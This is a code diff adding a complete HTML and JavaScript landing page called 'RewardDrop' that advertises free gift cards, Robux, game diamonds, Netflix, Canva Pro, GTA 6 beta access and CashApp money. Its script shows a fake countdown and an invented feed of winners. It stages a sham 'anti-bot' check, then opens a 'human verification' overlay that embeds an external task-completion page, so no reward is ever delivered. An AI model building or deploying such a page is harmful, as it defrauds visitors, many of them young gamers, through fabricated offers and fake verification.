@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RewardDrop | Exclusive Global Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        body {
+            background: linear-gradient(rgba(10, 10, 15, 0.9), rgba(10, 10, 15, 0.98)), 
+                        url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
+            background-size: cover;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        header {
+            text-align: center;
+            margin-top: 30px;
+            margin-bottom: 25px;
+        }
+        header h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            background: linear-gradient(90deg, #00f2fe, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+            letter-spacing: 2px;
+        }
+        header p {
+            color: #b0b0c0;
+            font-size: 1rem;
+        }
+
+        .timer-bar {
+            background: rgba(255, 71, 87, 0.15);
+            border: 1px solid #ff4757;
+            color: #ff4757;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+            box-shadow: 0 0 15px rgba(255, 71, 87, 0.2);
+        }
+
+        .offers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            width: 100%;
+            max-width: 1100px;
+            margin-bottom: 40px;
+        }
+        .offer-card {
+            background: rgba(26, 26, 36, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #2a2a35;
+            position: relative;
+            overflow: hidden;
+        }
+        .offer-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 30px rgba(0, 242, 254, 0.25);
+            border-color: #00f2fe;
+        }
+        .offer-img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border: 2px solid #2a2a35;
+            background-color: #1a1a24;
+        }
+        
+        /* تنسيق خاص للصور التي بها شعارات لكي لا يتم قصها */
+        .contain-img {
+            object-fit: contain;
+            padding: 10px;
+        }
+
+        .offer-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .offer-desc {
+            font-size: 0.85rem;
+            color: #9e9ea0;
+            margin-bottom: 20px;
+            min-height: 40px;
+        }
+        .claim-btn {
+            display: block;
+            text-decoration: none;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            color: white;
+            font-weight: 800;
+            padding: 12px;
+            border-radius: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            width: 100%;
+            cursor: pointer;
+            border: none;
+            font-size: 0.95rem;
+        }
+        .claim-btn:hover {
+            opacity: 0.9;
+            transform: scale(1.03);
+        }
+        
+        .btn-shein { background: linear-gradient(45deg, #111, #333); }
+        .btn-robux { background: linear-gradient(45deg, #222, #444); }
+        .btn-ff { background: linear-gradient(45deg, #ff5252, #ff1744); }
+        .btn-netflix { background: linear-gradient(45deg, #e50914, #b20710); }
+        .btn-canva { background: linear-gradient(45deg, #00c4cc, #7d2ae8); }
+        .btn-gta { background: linear-gradient(45deg, #ff9f43, #ff6b6b); }
+        .btn-cash { background: linear-gradient(45deg, #20bf6b, #0fb9b1); }
+        
+        .pulse-badge {
+            position: absolute;
+            top: 15px;
+            right: -35px;
+            background: #ff4757;
+            color: white;
+            font-size: 0.7rem;
+            font-weight: 800;
+            padding: 5px 40px;
+            transform: rotate(45deg);
+            text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(255, 71, 87, 0.6);
+            z-index: 2;
+        }
+
+        .live-ticker {
+            background: rgba(20, 20, 30, 0.9);
+            border: 1px solid #2a2a35;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            color: #00f2fe;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            justify-content: center;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            background-color: #20bf6b;
+            border-radius: 50%;
+            animation: pulseDot 1.5s infinite;
+        }
+        @keyframes pulseDot {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(32, 191, 107, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(32, 191, 107, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(32, 191, 107, 0); }
+        }
+
+        #loading-overlay, #locker-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(10, 10, 15, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 9998;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        #locker-overlay { z-index: 9999; backdrop-filter: blur(15px); }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(0, 242, 254, 0.2);
+            border-top-color: #00f2fe;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .loading-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #00f2fe;
+            text-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
+        }
+
+        .locker-box {
+            width: 95%;
+            max-width: 600px;
+            height: 85vh;
+            background: #1a1a24;
+            border-radius: 15px;
+            border: 2px solid #ff4757;
+            box-shadow: 0 0 40px rgba(255, 71, 87, 0.3);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .locker-header {
+            background: #0f0f13;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #2a2a35;
+        }
+        .locker-header h2 { color: #ff4757; font-size: 1.1rem; margin-bottom: 3px; }
+        .locker-header p { color: #a0a0b0; font-size: 0.8rem; }
+        .locker-box iframe { width: 100%; flex-grow: 1; border: none; background: #ffffff; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>RewardDrop</h1>
+        <p>Select your exclusive reward and verify to unlock.</p>
+    </header>
+
+    <div class="timer-bar" id="countdown">⚡ Limited Slots Available: 04:59</div>
+
+    <div class="live-ticker">
+        <div class="dot"></div>
+        <span id="ticker-text">User from USA just unlocked $750 Shein Card</span>
+    </div>
+
+    <div class="offers-grid">
+        <!-- 1. شي إن -->
+        <div class="offer-card">
+            <div class="pulse-badge">Hot</div>
+            <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=500&q=80" alt="Shein" class="offer-img">
+            <h2 class="offer-title">$750 Shein Gift Card</h2>
+            <p class="offer-desc">Get a free $750 Shein shopping spree. Limited time offer!</p>
+            <button class="claim-btn btn-shein open-locker">Claim Now</button>
+        </div>
+
+        <!-- 2. روبلوكس (مربوطة بصورتك) -->
+        <div class="offer-card">
+            <div class="pulse-badge">Viral</div>
+            <img src="images (1).jpg" alt="Roblox" class="offer-img contain-img">
+            <h2 class="offer-title">500 Free Robux</h2>
+            <p class="offer-desc">Instantly add 500 Robux to your account. No password needed.</p>
+            <button class="claim-btn btn-robux open-locker">Claim Now</button>
+        </div>
+
+        <!-- 3. فري فاير (مربوطة بصورتك) -->
+        <div class="offer-card">
+            <div class="pulse-badge">New</div>
+            <img src="images.jpg" alt="Free Fire" class="offer-img">
+            <h2 class="offer-title">530 Free Diamonds</h2>
+            <p class="offer-desc">Get Free Fire diamonds directly to your player ID instantly.</p>
+            <button class="claim-btn btn-ff open-locker">Claim Now</button>
+        </div>
+
+        <!-- 4. كانفا برو (مربوطة بصورتك) -->
+        <div class="offer-card">
+            <img src="images (2).jpg" alt="Canva Pro" class="offer-img contain-img">
+            <h2 class="offer-title">Canva Pro Lifetime Access</h2>
+            <p class="offer-desc">Activate Canva Pro team invite for unlimited premium templates.</p>
+            <button class="claim-btn btn-canva open-locker">Claim Now</button>
+        </div>
+
+        <!-- 5. نتفلكس -->
+        <div class="offer-card">
+            <img src="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?auto=format&fit=crop&w=500&q=80" alt="Netflix" class="offer-img">
+            <h2 class="offer-title">Netflix Premium 1 Year</h2>
+            <p class="offer-desc">Unlock 4K ultra HD private Netflix streaming account.</p>
+            <button class="claim-btn btn-netflix open-locker">Claim Now</button>
+        </div>
+
+        <!-- 6. جي تي إيه 6 -->
+        <div class="offer-card">
+            <img src="https://images.unsplash.com/photo-1605106702734-205df224ecce?auto=format&fit=crop&w=500&q=80" alt="GTA" class="offer-img">
+            <h2 class="offer-title">GTA 6 Beta Access</h2>
+            <p class="offer-desc">Get an exclusive invite code for the GTA 6 closed beta.</p>
+            <button class="claim-btn btn-gta open-locker">Claim Now</button>
+        </div>
+
+        <!-- 7. كاش آب (مربوطة بصورتك) -->
+        <div class="offer-card">
+            <img src="images (3).jpg" alt="CashApp" class="offer-img contain-img" style="background-color: white;">
+            <h2 class="offer-title">$500 CashApp Transfer</h2>
+            <p class="offer-desc">Receive a direct $500 transfer to your CashApp account.</p>
+            <button class="claim-btn btn-cash open-locker">Claim Now</button>
+        </div>
+    </div>
+
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loading-msg">Connecting to secure server...</div>
+    </div>
+
+    <div id="locker-overlay">
+        <div class="locker-box">
+            <div class="locker-header">
+                <h2>⚠️ Human Verification Required</h2>
+                <p>Unusual activity detected. Complete 1 task below to unlock your reward.</p>
+            </div>
+            <iframe src="https://appcomplete.org/cl/i/42dpo4"></iframe>
+        </div>
+    </div>
+
+    <script>
+        let time = 299; 
+        const countdownEl = document.getElementById('countdown');
+        setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            countdownEl.innerHTML = `⚡ Limited Slots Available: ${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            if (time > 0) time--;
+        }, 1000);
+
+        const activities = [
+            "User from USA just unlocked $750 Shein Card",
+            "User from Brazil just claimed Free Fire Diamonds",
+            "User from UK got Netflix Premium Access",
+            "User from Germany unlocked Canva Pro",
+            "User from Canada claimed 500 Robux"
+        ];
+        let actIndex = 0;
+        setInterval(() => {
+            actIndex = (actIndex + 1) % activities.length;
+            document.getElementById('ticker-text').innerText = activities[actIndex];
+        }, 4000);
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const lockerOverlay = document.getElementById('locker-overlay');
+            const loadingMsg = document.getElementById('loading-msg');
+            const openButtons = document.querySelectorAll('.open-locker');
+
+            openButtons.forEach(button => {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    document.body.style.overflow = 'hidden';
+                    loadingOverlay.style.display = 'flex';
+                    loadingMsg.style.color = '#00f2fe';
+                    loadingMsg.innerText = "Connecting to secure server...";
+                    
+                    setTimeout(() => { loadingMsg.innerText = "Allocating your reward code..."; }, 1500);
+                    setTimeout(() => { loadingMsg.innerText = "Checking IP address..."; }, 3000);
+                    setTimeout(() => { 
+                        loadingMsg.style.color = '#ff4757';
+                        loadingMsg.innerText = "Anti-Bot System Triggered!"; 
+                    }, 4200);
+
+                    setTimeout(() => {
+                        loadingOverlay.style.display = 'none';
+                        lockerOverlay.style.display = 'flex';
+                    }, 5500);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
